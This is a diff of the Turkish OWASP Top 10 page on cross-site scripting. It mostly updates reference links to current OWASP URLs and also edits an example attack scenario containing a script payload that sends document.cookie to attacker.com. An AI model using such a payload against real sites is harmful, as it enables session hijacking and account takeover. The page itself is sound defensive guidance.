@@ -20,7 +20,7 @@ Sıradan XSS saldırıları oturum çalma, hesap ele geçirme, MFA atlatma, DOM 
 XSS açıklığının önlenmesi güvenilmeyen verinin aktif tarayıcı içeriğinden ayırılmasını gerektirmektedir. Bu aşağıdakiler aracılığıyla yapılabilmektedir:
 
 * Ruby on Rails, React JS gibi tasarımsal olarak XSS'i kendiliğinden sterilize eden çerçevelerin kullanımı. Her bir çerçevenin XSS koruma limitleri öğrenilmeli ve kapsamları dışında kalan kullanım örneklerinin üstesinden gelinmelidir.
-* HTML çıktısında yer aldığı bağlama göre (body, attribute, JavaScript, CSS veya URL) güvenilmeyen HTTP isteği girdilerinin sterilize edilmesi Yansıtılmış ve Depolanmış XSS açıklıklarını çözecektir. [OWASP Kopya Kağıdı: XSS Korumaları](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) gerekli veri sterilizasyon teknikleri ile ilgili detayları içermektedir.
+* HTML çıktısında yer aldığı bağlama göre (body, attribute, JavaScript, CSS veya URL) güvenilmeyen HTTP isteği girdilerinin sterilize edilmesi Yansıtılmış ve Depolanmış XSS açıklıklarını çözecektir. [OWASP Kopya Kağıdı: XSS Korumaları](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) gerekli veri sterilizasyon teknikleri ile ilgili detayları içermektedir.
 * İstemci tarafındaki tarayıcı dokümanı değiştirilirken bağlama duyarlı kodlamanın kullanılması DOM XSS açıklığına karşı koruma sağlamaktadır. Bu durum kaçınılmaz olduğunda, OWASP Kopya Kağıdı: DOM tabanlı XSS Koruması isimli dokümanda belirtildiği gibi bağlama duyarlı strelizasyon teknikleri tarayıcı API'lerine uygulanabilir.
 * XSS'e karşı derinlemesine savunma kontrolü olarak bir [İçerik Güvenlik Politikası'nın (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) kullanılması. Eğer iç dosya ekleme(örn. dizin aşımı veya izin verilen içerik teslim ağlarından zafiyet içeren kütüphaneler) aracılığıyla zararlı kodun eklenmesine yol açabilecek başka bir açıklık bulunmuyorsa, etkili olacaktır.
 
@@ -31,7 +31,7 @@ XSS açıklığının önlenmesi güvenilmeyen verinin aktif tarayıcı içeriğ
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 Saldırgan tarayıcısında 'CC' parametresini aşağıdaki gibi değiştirmektedir:
 
-`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
+`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 Bu saldırı kurbanın oturum ID değerinin saldırganın sitesine yollanmasına yol açmakta, bu durum da saldırganın kullanıcının mevcut oturumunu ele geçirmesine izin vermektedir.
 
@@ -41,16 +41,16 @@ Bu saldırı kurbanın oturum ID değerinin saldırganın sitesine yollanmasına
 
 ### OWASP
 
-* [OWASP Proaktif Kontroller: Verinin Kodlanması](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Proaktif Kontroller: Verinin Doğrulanması](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Uygulama Güvenliği Doğrulama Standardı: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
-* [OWASP Test Rehberi: Yansıtılmış XSS Testleri](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
-* [OWASP Test Rehberi: Depolanmış XSS Testleri](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
-* [OWASP Test Rehberi: DOM XSS Testleri](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
-* [OWASP Kopya Kağıdı: XSS Önlemleri](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
-* [OWASP Kopya Kağıdı: DOM tabanlı XSS Önlemleri](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
-* [OWASP Kopya Kağıdı: XSS Filtre Atlatma](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [OWASP Java Encoder Projesi](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+* [OWASP Proaktif Kontroller: Verinin Kodlanması](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Proaktif Kontroller: Verinin Doğrulanması](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Uygulama Güvenliği Doğrulama Standardı: V5](https://owasp.org/www-project-application-security-verification-standard/)
+* [OWASP Test Rehberi: Yansıtılmış XSS Testleri](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
+* [OWASP Test Rehberi: Depolanmış XSS Testleri](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
+* [OWASP Test Rehberi: DOM XSS Testleri](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
+* [OWASP Kopya Kağıdı: XSS Önlemleri](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+* [OWASP Kopya Kağıdı: DOM tabanlı XSS Önlemleri](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+* [OWASP Kopya Kağıdı: XSS Filtre Atlatma](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+* [OWASP Java Encoder Projesi](https://owasp.org/www-project-java-encoder/)
 
 ### Dış Kaynaklar
 
